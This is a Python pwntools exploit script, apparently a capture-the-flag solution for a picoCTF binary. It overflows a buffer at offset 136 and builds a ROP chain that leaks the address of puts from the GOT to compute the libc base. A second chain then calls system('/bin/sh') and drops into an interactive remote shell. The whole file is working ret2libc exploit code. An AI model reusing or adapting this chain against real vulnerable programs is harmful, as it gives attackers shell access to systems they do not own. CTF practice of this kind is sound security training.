from pwn import *

host = "mercury.picoctf.net"
port = 62289
exe  = "./vuln_patched"

context.binary = binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6")

OFFSET = 136   

def conn():
    if args.LOCAL:
        return process(exe)
    else:
        return remote(host, port)


def main():
    p = conn()
    rop1 = ROP(binary)
    padding = "A"*OFFSET
    rop1.raw(padding)
    rop1.puts(binary.got.puts)
    rop1.main()
    p.sendline(rop1.chain())
    p.recvlines(2)
    leaked = p.recvline().strip()
    leaked_puts = u64(leaked.ljust(8,b"\x00"))
    libc.address = leaked_puts - libc.sym.puts
    rop = ROP([binary,libc])
    rop.raw(padding)
    rop.raw(0x000000000040052e)
    rop.system(next(libc.search(b"/bin/sh")))
    print(rop.chain())
    p.sendline(rop.chain())
    p.interactive()


if __name__ == "__main__":
    main()
